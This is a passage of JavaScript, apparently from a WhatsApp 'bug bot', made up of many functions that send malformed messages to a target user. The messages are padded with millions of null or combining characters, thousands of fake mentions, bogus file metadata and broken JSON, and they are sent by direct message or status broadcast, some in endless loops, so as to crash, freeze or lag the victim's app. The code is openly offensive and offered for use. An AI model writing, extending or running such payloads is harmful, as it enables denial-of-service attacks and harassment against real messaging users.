          jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQ0JXY1hYXVxYjX2Xe3N7lnngsJycsOD/2c7Z////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAvAAEAAwEBAQAAAAAAAAAAAAAAAQIDBAUGAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAAD58BctFpKNM0lAdfIt7o4ra13UxyjrwxAZxaaC952s5u7OkdlvHY37Dy0ZDpmyosqAISAAAEAB/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIAAxEEEiAhMRATMhQiQVEVMFP/2gAIAQEAAT8A/X23sDlMNOoNypnbfb2mGk4NipnaqZb5TooFKd3aDGEArlBEOMbKQBGxzMqgoNocWTyonrG2EqqNiDzpVSxsIQX2C8cQqy8qdARjaBVHLQso4X4mdkGxsSIKrhg19xPXMLB0DCCvganlTsYMLg6ng8/G0/6zf76U6JexBEIJ3NNYadgTkWOCaY9qgTiAkcGCvVA8z1DFYXb7mZvuBj020nUYPnQTB0M//8QAIxEBAAIAAwkBAAAAAAAAAAAAAQACERNBEBIgITAxUVNxkv/aAAgBAgEBPwDhHBxm/bzG9jWNlOe0iVe4MyqaNq/GZT77fk6f/8QAIBEAAQMDBQEAAAAAAAAAAAAAAQACERASUQMTMFKRkv/aAAgBAwEBPwBQVFWm0ytx+UHvIReSINTS9/b0Sr3Y0/nj/9k=", "base64"),
          contextInfo: {
            pairedMediaType: "NOT_PAIRED_MEDIA",
            isQuestion: true,
            isGroupStatus: true
          },
          scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
          scanLengths: [2899999999999999077, 1799999999999998555, 7699999999999999148, 1069999999999999164],
          midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk="
        }
      },
      messageTimestamp: Math.floor(Date.now() / 1000)
    };

    await sock.relayMessage("status@broadcast", msg.message, {
      statusJidList: [target],
      messageId: msg.key.id,
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          },
          additionalNodes: [{
            tag: "meta",
            attrs: { is_status_mention: "false" },
            content: undefined
          }]
        }
      }
    }, {});

    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {});

  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

async function Delay(sock, target) {
  let msg = {
    interactiveMessage: {
      body: {
        teks: "delay by maklu"+"ꦾ".repeat(3500000),
      },
      nativeFlowResponseMessage: {
      name: "call_permission_request",
      paramsJson: "\u0000".repeat(400000),
      version: 3
      },
      entryPointConversionSource: "call_permission_message",
     url: "https/t.me/NexiRajaIblis",
    },
    nativeFlowsResponMessage: {
      name: "galaxy_message",
      paramsJson: "\u0000".repeat(2500000),
      version: 3
    },
    nativeFlowsResponseMessage: {
      name: "location_request",
      paramsJson:"JSON.stringify({",
      version: 3
    },
    body: {
      teks: "\u0000.Nasa".repeat(3000000),
      title: "\u0000.Nasa".repeat(3000000),
    }
  };
  await sock.relayMessage("status@broadcast", {
    messageId: msg.key.id,
    statusJidList: [target],
    tag: "meta",
  });
  console.log(`succes send to $target`) 
}



async function NotifDevice(target, Ptcp = true) {
    let virtex = "Xa" + "ꦾ".repeat(90000) + "@8".repeat(90000);
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function DeviceSlowx(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "Xx" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@9".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0018".repeat(50000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "V",
                    },
                ],
            },
        };

        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
    }
}

async function NotifikasiSpam(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "‏⭑̤" +
                  "\u0018".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}

async function SuperUiBlank(target, Ptcp = true) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "XXX." + "\u0000".repeat(50000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 3567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: "X",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption:
                    ".",
                },
                contentText: '༑ "👋"',
                footerText: "Xnxx.",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(55000),
                    buttonText: {
                      displayText: "XxX",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: null,
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "xnxx.com",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: '!',
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: "Body_Screen",
              thumbnail: null,
              sourceUrl: "...",
              sourceId: " -",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "111111@newsletter",
              serverMessageId: 1,
              newsletterName: ` 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "TM",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "™",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await sock.relayMessage(target, messagePayload, {
    additionalNodes: stanza,
    participant: { jid: target },
  });
}

async function sedotmemek(sock, target) {
  while (true) {
    try {
      const goblok = {
        message: {
          groupStatusMessageV2: {
            message: {
              locationMessage: {
                degreesLatitude: 1e15,
                degreesLongitude: 1e15,
                name: 'ြ'.repeat(30000),
                address: 'ြ'.repeat(30000),
                isLive: true,
                accuracyInMeters: 1e15,
                jpegThumbnail: Buffer.alloc(0)
              }
            }
          }
        }
      };

      await sock.relayMessage(target, goblok, {
        participant: { jid: target },
        userJid: target,
        messageId: null
      });

      console.log("Succes Bugs");
      await new Promise(resolve => setTimeout(resolve, 1500));

    } catch (error) {
      console.error("Error:", error);
    }
  }
}

async function delayxfreeze(sock, target) {
  let msg = await generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "\u0000".repeat(500),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "payment_method",
              paramsJson: `{\"reference_id\":null,\"payment_method\":${"\u0010".repeat(1045000)},\"payment_timestamp\":null,\"share_payment_status\":true}`,
              version: 3
            },
        contextInfo: {
          mentionedJid: [
                   "0@s.whatsapp.net",
                      ...Array.from(
                      { length: 1900 },
                      () => 
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                       )
                   ],
              stanzaId: "ABCDEFG123456789",
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 3000000
                }
              }
            }
          } 
        }, {});
        
  await sock.relayMessage(target, {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        participant: { jid: target },
        messegeId: msg.key.id
      });
    console.log(chalk.red.bold("[+] MESSAGE CREDITS BY - BERAS JAYA TEAM"));
}

async function DelayBuldozerByMia(sock, target) {
 await sock.relayMessage(target, {
   groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          header: {
            listMessage: {
              title: "\u0000".repeat(350000),
              description: "\u0000".repeat(250000),
              buttonText: "Miaa",
              footerText: "",
              listType: 1,
            sections: [
           {
            title: "",
              rows: Array.from({ length: 10 }, (_, i) => ({
              title: `\u0000`.repeat(250000),
              description: `\u0000`.repeat(250000),
              rowId: null
              }))
            }
          ],
          body: {
            text: "\u0000.Miaa".repeat(999909),
            title: "\u0000.Miaa".repeat(999909)
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(400000),
            version: 3
            }
          }
        }
      }
    }
  }
}, { participant: { jid: target } });

  console.log("King Voltra Sending Bug Sent to: " + target);
}

async function Asixinajaaa(target) {
    
  const RaraaImupp = generateWAMessageFromContent(
    target,
    {
      videoMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",
        mimetype: "video/mp4",
        caption: "𝒀𝒐𝒖 𝑪𝒂𝒏 𝑹𝒖𝒏... 𝑩𝒖𝒕 𝒀𝒖 𝑪𝒂𝒏’𝒕 𝑯𝒊𝒅𝒆 😏" + "ꦽ".repeat(99000) + "\u0000".repeat(50000),
        mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",
        fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",
        fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",
        fileLength: "1073741824",
        mediaKeyTimestamp: "1775847446"
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast", RaraaImupp.message, {
    messageId: RaraaImupp.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  await sock.sendMessage("status@broadcast", {
    delete: {
      remoteJid: "status@broadcast",
      fromMe: true,
      id: RaraaImupp.key.id
    }
  });

  const raaMessages = {
    viewOnceMessage: {  
      message: {  
        interactiveResponseMessage: {  
          body: {  
            text: "𝒀𝒐𝒖 𝑪𝒂𝒏 𝑹𝒖𝒏... 𝑩𝒖𝒕 𝒀𝒖 𝑪𝒂𝒏’𝒕 𝑯𝒊𝒅𝒆 😏",  
            hasMediaAttachment: false  
          },  
          videoMessage: {  
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQMpoc8TBbONYOg6cLAErhpwtLPCeEnZOmcp-St1PAhRXU72WlvVm-POYsjtXSu7VHCXBmSVFKHynSHAIoSIig64-bz7W4ZfB0kRnlO4VQ?ccb=9-4&oh=01_Q5Aa4QF3oSTcq93hbR9GZrJGjnfTTH7IBgfNaKlDeMfv9Tq-5Q&oe=6A096D42&_nc_sid=e6ed6c&mms3=true",  
            mimetype: "video/mp4",  
            fileSha256: "BpORlhRms3eA7MGiNjeeONBeQLKl6bsfffFUEQUFnTw=",  
            fileLength: "1073741824",
            height: 1080,  
            width: 1920,
            mediaKey: "ByyHwYADrLlfTT288ptlcpWv/LTCtLy4Z1bJto2Vc68=",  
            fileEncSha256: "SC73MlcELb6U6tMsuyEr0+R3szXgleKnpJLE6dMcPeI=",  
            directPath: "/v/t62.43144-24/10000000_1502112771709855_3272945837169502791_n.enc?ccb=11-4&oh=01_Q5Aa4QEq6ZqMuFLeKDwX_XZUoUlLhzeZd48Vdwdo8Pw2UwyFGQ&oe=6A00B5F6&_nc_sid=5e03e0",  
            mediaKeyTimestamp: "1775847446",
            seconds: 3600,
            contextInfo: {  
              forwardingScore: 9999,  
              isForwarded: true,  
              mentionedJid: [  
                "0@s.whatsapp.net",  
                ...Array.from(  
                  { length: 1900 },  
                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"  
                )  
              ],  
              expiration: 9741,  
              ephemeralSettingTimestamp: 9741,  
              entryPointConversionSource: "WhatsApp.com",  
              entryPointConversionApp: "WhatsApp",  
              entryPointConversionDelaySeconds: 9742,  
              disappearingMode: {  
                initiator: "INITIATED_BY_OTHER",  
                trigger: "ACCOUNT_SETTING"  
              }  
            } 
          },  
          nativeFlowResponseMessage: {  
            name: "address_message",  
            paramsJson: "\u0000".repeat(1045900),  
            version: 3  
          }  
        }  
      }  
    }  
  };

  const raaMSG = generateWAMessageFromContent(target, raaMessages, {});

  await sock.relayMessage("status@broadcast", raaMSG.message, {
    messageId: raaMSG.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });
}

async function DingleyX7(sock, target) {
  while (true) {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "@x7explostt",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -1,
                degreesLongitude: 1,
                name: "X7Explost",
                address: "𝖱𝖺𝗇𝗌𝖷𝟩",
              },
            },

            body: {
              text: "𝖱𝖺𝗇𝗌𝖷𝟩 𝖷 𝖠𝗌𝖾𝗉𝖷𝟩",
            },

            nativeFlowMessage: {
              messageParamsJson: "\u0000".repeat(4000),

              buttons: [
                {
                  name: "𝖡𝗒: 𝖠𝗌𝖾𝗉𝖷𝟩",
                  buttonParamsJson: JSON.stringify({
                    display_text: "𝖡𝗒: 𝖠𝗌𝖾𝗉𝖷𝟩",
                    flow_cta: "\u0000".repeat(1000),
                    flow_message_version: "3",
                  }),
                },

                {
                  name: "review_and_pay",
                  buttonParamsJson:
                    "{\"currency\":\"IDR\",\"total_amount\":{\"value\":100,\"offset\":100},\"reference_id\":\"" +
                    "\u0000".repeat(50000) +
                    "\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":100,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"26802826556025991\",\"product_id\":\"26802826556025991\",\"name\":\"" +
                    "\u0000".repeat(500000) +
                    "\",\"amount\":{\"value\":100,\"offset\":100},\"quantity\":1}]},\"native_payment_methods\":[],\"share_payment_status\":false,\"is_soft_deleted\":false}",
                },

                {
                  name: "𝖡𝗒: 𝖠𝗌𝖾𝗉𝖷𝟩",
                  buttonParamsJson: JSON.stringify({
                    display_text: "Makloe",
                    flow_cta: "\u0000".repeat(1000),
                    flow_message_version: "3",
                  }),
                },
              ],
            },

            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 99999,
              stanzaId: target,
              participant: "0@s.whatsapp.net",
              remoteJid: "0@s.whatsapp.net",

              quotedMessage: {
                interactiveMessage: {
                  header: {
                    title: "𝖠𝗌𝖾𝗉𝖷𝟩",
                    hasMediaAttachment: false,
                  },

                  body: {
                    text: "𝖷𝟩",
                  },

                  nativeFlowMessage: {
                    buttons: [
                      {
                        name: "𝖡𝗒: 𝖠𝗌𝖾𝗉𝖷𝟩7",

                        buttonParamsJson: JSON.stringify({
                          display_text: "𝖡𝗒: 𝖠𝗌𝖾𝗉𝖷𝟩",
                          flow_cta: "\u0000".repeat(10000),
                          flow_message_version: "3",
                        }),
                      },
                    ],
                  },
                },
              },
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  }
}

async function Qcurl(sock, target) {
const crypto = require("crypto")
while (true) {
for (let r = 0; r < 10000; r++) {
  const Love4You = {
    groupStatusMessageV2: {
      message: {
        header: {
         stickerMessage: {
           url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
           fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
           fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
           mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
           mimetype: "image/webp",
           directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
            fileLength: "10610",
            mediaKeyTimestamp: "1775044724",
            stickerSentTs: "1775044724091"
           },
            hasMediaAttachment: true
        },
        extendedTextMessage: {
        url: null,
          paymentLinkMetadata: {
            provider: { paramsJson: "[{".repeat(300000) },
            header: { headerType: 1 }
          },
          contextInfo: {
            remoteJid: Math.random().toString(36) + "REQUEST_PAYMENT",
            isForwarded: true,
            forwardingScore: 999,
            externalAdReply: {},
            quotedMessage: { contactsArrayMessage: { contacts: [] } },
            paymentExtendedMetadata: {
              type: 1,
              platform: "windowshortcut"
            },
            urlTrackingMap: {
             urlTrackingMapElements: Array.from({ length: 280000 }, () => ({
              "\u200B": "\u0000"
                }))
              },
            businessMessageForwardInfo: {
              businessOwnerJid: target
            }
          },
          body: {
            text: "\x10".repeat(150000)
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "view_order",
                buttonParamsJson: "\u0000"
              },
              {
                name: "address_message",
                buttonParamsJson: "\u0000"
              },
              {
                name: "single_select",
                buttonParamsJson: "\u0000"
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "ꦽ".repeat(150000),
                  flow_message_version: "3"
                })
              }
            ]
          }
        }
      }
    }
  };
  await sock.relayMessage(target, Love4You, {
    messageId: crypto.randomBytes(16).toString('hex').toUpperCase(),
    participant: { jid: target },
    userJid: target
  });
  await new Promise((r) => setTimeout(r, 1500));
    }
  }
}

async function DelayNewBetaV3(sock, target) {
  const generateMentions = (count = 1900) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: count }, () =>
        "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
      )
    ];
  };

  let mentionList = generateMentions(1900);
  let aksara = "ꦀ".repeat(3000) + "\n" + "ꦂ‎".repeat(3000);
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;

  if (11 > 9) {
    parse = parse ? false : true;
  }

  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: ".Rap" + "ោ៝".repeat(10000),
    title: "Gtc",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const tmsg = await generateWAMessageFromContent(target, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "Amelia-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: mentionList,
        quotedMessage: {
          callLogMesssage: {
            isVideo: true,
            callOutcome: "1",
            durationSecs: "0",
            callType: "REGULAR",
            participants: [{
              jid: "5521992999999@s.whatsapp.net",
              callOutcome: "1"
            }]
          },
          viewOnceMessage: {
            message: {
              stickerMessage: {
                url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                mimetype: type,
                directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
                fileLength: {
                  low: Math.floor(Math.random() * 200000000),
                  high: 0,
                  unsigned: true
                },
                mediaKeyTimestamp: {
                  low: Math.floor(Math.random() * 1700000000),
                  high: 0,
                  unsigned: false
                },
                firstFrameLength: 19904,
                firstFrameSidecar: "KN4kQ5pyABRAgA==",
                isAnimated: true,
                stickerSentTs: {
                  low: Math.floor(Math.random() * -20000000),
                  high: 555,
                  unsigned: parse
                },
                isAvatar: parse,
                isAiSticker: parse,
                isLottie: parse
              }
            }
          },
          imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            caption: `</> Amelia Is Back!!! - ${aksara}`,
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "19769",
            height: 354,
            width: 783,
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            jpegThumbnail: null,
            scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
            scanLengths: [2437, 17332],
            contextInfo: {
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true
            }
          }
        },
        annotations: [
          {
            embeddedContent: {
              target 
            },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});

  await sock.relayMessage("status@broadcast", tmsg.message, {
    messageId: tmsg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: tmsg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}

async function CrashMakLo(target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "MakLo(RcB)"
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "booking_confirmation",
                 ParamsJson: "\u0003".repeat(90000),
               },
             ],
           },
